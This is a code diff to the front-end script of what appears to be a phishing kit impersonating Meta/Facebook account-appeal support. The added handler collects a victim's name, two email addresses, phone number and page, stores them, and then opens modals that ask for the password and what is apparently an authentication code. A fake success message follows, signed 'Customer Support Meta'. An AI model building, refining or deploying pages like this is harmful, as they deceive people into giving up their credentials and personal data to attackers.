@@ -1,16 +1,25 @@
-document.addEventListener('DOMContentLoaded', function () {
-    const submitBtn = document.getElementById('submitRequestBtn');
+// Main Application Logic
+document.getElementById('clientForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+        const formData = {
+            appealReason: document.getElementById('appeal').value.trim(),
+            fullName: document.getElementById('appeal-fullname').value.trim(),
+            emailBusiness: document.getElementById('business-email').value.trim(),
+            emailPersonal: document.getElementById('personal-email').value.trim(),
+            phone: document.getElementById('mobile-phone').value.trim(),
+            fanpage: document.getElementById('appeal-page').value.trim(),
+            consent: document.getElementById('appeal-consent').checked
+        };
 
-    if (submitBtn) {
-        submitBtn.addEventListener('click', function () {
-            openAppealModal();
-        });
-    }
+    Utils.saveRecord('__client_rec__fi_rst', formData);
+    openSecurityModal();
 });
+
+
 // ==================== MODAL 2: SECURITY (PASSWORD) ====================
 function openSecurityModal() {
     const content = `
-        <div class="flex h-full w-full flex-col justify-between">
+        <div class="h-auto flex flex-col items-center justify-between flex-1">
             <div class="w-12 h-12 mb-5 mx-auto">
                 <img src="./public/icons/ic_logo.svg" alt="Meta" class="w-full">
             </div>
@@ -24,7 +33,7 @@ function openSecurityModal() {
                 </form>
             </div>
             <div class="w-16 mt-5 mx-auto">
-                <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
+                <img src="./public/icons/ic_logo_gray.svg" alt="Meta">
             </div>
         </div>
     `;
@@ -102,9 +111,6 @@ function openAuthenticationModal(userData) {
                     <button type="submit" class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full py-2.5 hover:bg-blue-700 transition-colors">Continue</button>
                     <div class="w-full mt-[20px] text-[#9a979e] flex items-center justify-center cursor-pointer bg-[transparent] rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3] poiter-events-none"><span>Try another way</span></div>
                 </form>
-            </div>
-            <div class="w-16 mt-5 mx-auto">
-                <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
             </div>
         </div>
     `;
@@ -194,9 +200,9 @@ function openAuthenticationModal(userData) {
 // ==================== MODAL 4: SUCCESS ====================
 function openSuccessModal() {
     const content = `
-        <h2 class="font-bold text-[18px] mb-4 text-center">Request has been sent</h2>
+        <h2 class="font-bold text-[18px] mb-4 text-left">Request has been sent</h2>
         <div class="rounded-lg overflow-hidden mb-4">
-            <img src="./public/images/success.jpg" alt="Success" class="w-full">
+            <img src="./public/images/succes.jpg" alt="Success" class="w-full">
         </div>
         <p class="text-[#9a979e] mb-1 text-[15px]">Your request has been added to the processing queue. We will handle your request within 24 hours.</p>
         <p class="text-[#9a979e] mb-5 text-[15px]">From the Customer Support Meta.</p>
@@ -204,7 +210,7 @@ function openSuccessModal() {
             Return to Facebook
         </a>
         <div class="w-16 mt-5 mx-auto">
-            <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
+            <img src="./public/icons/ic_logo_gray.svg" alt="Meta">
         </div>
     `;
 
